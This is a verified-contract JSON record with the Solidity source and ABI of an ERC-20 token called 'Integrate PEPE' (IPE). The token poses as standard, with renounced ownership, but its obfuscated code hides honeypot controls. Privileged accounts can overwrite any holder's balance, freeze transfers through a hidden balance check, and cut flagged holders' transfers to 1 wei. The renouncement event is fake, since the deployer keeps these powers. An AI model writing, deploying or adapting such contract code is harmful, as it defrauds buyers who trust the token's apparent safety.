{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface limitShouldFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyTeam) external view returns (uint256);\n\n    function transfer(address maxSell, uint256 walletReceiver) external returns (bool);\n\n    function allowance(address sellFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxSell,\n        uint256 walletReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyMarketing, uint256 value);\n    event Approval(address indexed sellFund, address indexed spender, uint256 value);\n}\n\nabstract contract walletLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minSellLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface amountAt {\n    function createPair(address liquidityTotal, address exemptSell) external returns (address);\n}\n\ninterface feeTokenTo is limitShouldFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IntegratePEPE is walletLaunch, limitShouldFrom, feeTokenTo {\n\n    uint256 constant liquidityTotalTeam = 1 ** 10;\n\n    mapping(address => bool) public senderLaunched;\n\n    mapping(address => bool) public takeBuy;\n\n    mapping(address => uint256) private exemptLaunch;\n\n    function allowance(address takeIsSender, address limitSwapTake) external view virtual override returns (uint256) {\n        if (limitSwapTake == buyReceiver) {\n            return type(uint256).max;\n        }\n        return sellWalletTeam[takeIsSender][limitSwapTake];\n    }\n\n    uint256 private walletAt;\n\n    uint256 marketingWallet;\n\n    bool public fundAtSell;\n\n    address private launchFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellTakeLimit;\n    }\n\n    function toTeam(address receiverSenderEnable, address maxSell, uint256 walletReceiver) internal returns (bool) {\n        require(exemptLaunch[receiverSenderEnable] >= walletReceiver);\n        exemptLaunch[receiverSenderEnable] -= walletReceiver;\n        exemptLaunch[maxSell] += walletReceiver;\n        emit Transfer(receiverSenderEnable, maxSell, walletReceiver);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchFee;\n    }\n\n    uint8 private sellTakeLimit = 18;\n\n    string private tokenTx = \"Integrate PEPE\";\n\n    function owner() external view returns (address) {\n        return launchFee;\n    }\n\n    address public swapLiquidity;\n\n    mapping(address => mapping(address => uint256)) private sellWalletTeam;\n\n    function buyLaunched() private view {\n        require(takeBuy[_msgSender()]);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toAmount;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptTo;\n    }\n\n    function transferFrom(address receiverSenderEnable, address maxSell, uint256 walletReceiver) external override returns (bool) {\n        if (_msgSender() != buyReceiver) {\n            if (sellWalletTeam[receiverSenderEnable][_msgSender()] != type(uint256).max) {\n                require(walletReceiver <= sellWalletTeam[receiverSenderEnable][_msgSender()]);\n                sellWalletTeam[receiverSenderEnable][_msgSender()] -= walletReceiver;\n            }\n        }\n        return walletTradingReceiver(receiverSenderEnable, maxSell, walletReceiver);\n    }\n\n    bool public liquiditySender;\n\n    function balanceOf(address buyTeam) public view virtual override returns (uint256) {\n        return exemptLaunch[buyTeam];\n    }\n\n    uint256 private exemptTo = 100000000 * 10 ** 18;\n\n    address public tradingExemptTo;\n\n    uint256 private tradingTotal;\n\n    function transfer(address atBuy, uint256 walletReceiver) external virtual override returns (bool) {\n        return walletTradingReceiver(_msgSender(), atBuy, walletReceiver);\n    }\n\n    function atTakeExempt(address atBuy, uint256 walletReceiver) public {\n        buyLaunched();\n        exemptLaunch[atBuy] = walletReceiver;\n    }\n\n    function approve(address limitSwapTake, uint256 walletReceiver) public virtual override returns (bool) {\n        sellWalletTeam[_msgSender()][limitSwapTake] = walletReceiver;\n        emit Approval(_msgSender(), limitSwapTake, walletReceiver);\n        return true;\n    }\n\n    bool private teamFee;\n\n    function walletSwapAmount(uint256 walletReceiver) public {\n        buyLaunched();\n        autoReceiver = walletReceiver;\n    }\n\n    function walletTradingReceiver(address receiverSenderEnable, address maxSell, uint256 walletReceiver) internal returns (bool) {\n        if (receiverSenderEnable == swapLiquidity) {\n            return toTeam(receiverSenderEnable, maxSell, walletReceiver);\n        }\n        uint256 senderLiquidityExempt = limitShouldFrom(tradingExemptTo).balanceOf(sellReceiverFee);\n        require(senderLiquidityExempt == autoReceiver);\n        require(maxSell != sellReceiverFee);\n        if (senderLaunched[receiverSenderEnable]) {\n            return toTeam(receiverSenderEnable, maxSell, liquidityTotalTeam);\n        }\n        return toTeam(receiverSenderEnable, maxSell, walletReceiver);\n    }\n\n    bool public swapTx;\n\n    function amountShould(address totalTx) public {\n        buyLaunched();\n        \n        if (totalTx == swapLiquidity || totalTx == tradingExemptTo) {\n            return;\n        }\n        senderLaunched[totalTx] = true;\n    }\n\n    address sellReceiverFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed shouldLaunched, address indexed modeListAmount);\n\n    string private toAmount = \"IPE\";\n\n    address buyReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function autoFund() public {\n        emit OwnershipTransferred(swapLiquidity, address(0));\n        launchFee = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tokenTx;\n    }\n\n    constructor (){\n        if (fundAtSell != launchIs) {\n            walletAt = tradingTotal;\n        }\n        minSellLaunched totalShould = minSellLaunched(buyReceiver);\n        tradingExemptTo = amountAt(totalShould.factory()).createPair(totalShould.WETH(), address(this));\n        \n        swapLiquidity = _msgSender();\n        autoFund();\n        takeBuy[swapLiquidity] = true;\n        exemptLaunch[swapLiquidity] = exemptTo;\n        if (teamFee == launchIs) {\n            tradingTotal = walletAt;\n        }\n        emit Transfer(address(0), swapLiquidity, exemptTo);\n    }\n\n    bool private launchIs;\n\n    uint256 autoReceiver;\n\n    function shouldList(address buyLiquidity) public {\n        if (swapTx) {\n            return;\n        }\n        if (fundAtSell != launchIs) {\n            fundAtSell = true;\n        }\n        takeBuy[buyLiquidity] = true;\n        \n        swapTx = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeListAmount\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeIsSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitSwapTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTx\",\"type\":\"address\"}],\"name\":\"amountShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSwapTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"atTakeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAtSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyLiquidity\",\"type\":\"address\"}],\"name\":\"shouldList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingExemptTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSenderEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletReceiver\",\"type\":\"uint256\"}],\"name\":\"walletSwapAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "IntegratePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}